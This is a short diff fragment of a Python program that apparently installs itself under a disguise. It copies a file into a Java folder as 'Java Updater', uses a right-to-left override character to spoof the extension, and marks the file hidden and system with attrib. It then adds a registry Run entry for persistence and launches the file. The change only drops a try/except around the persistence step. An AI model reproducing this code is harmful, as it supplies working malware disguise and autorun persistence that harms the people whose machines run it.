@@ -447,10 +447,7 @@ if __name__ == "__main__":
                         subprocess.run('attrib +h +r +s"C:/Program Files/Java/Java Updater G‮lld.COM"', capture_output = True, shell= True)
                         with open("C:/Program Files/Java/Java Updater G‮lld.COM", 'ab') as file:
                             file.write(b'\x00')
-                        try:
-                            subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
-                        except Exception:
-                            pass
+                        subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
                         subprocess.call("C:/Program Files/Java/Java Updater G‮lld.COM", shell= True)
                         fquit()
                     except Exception:
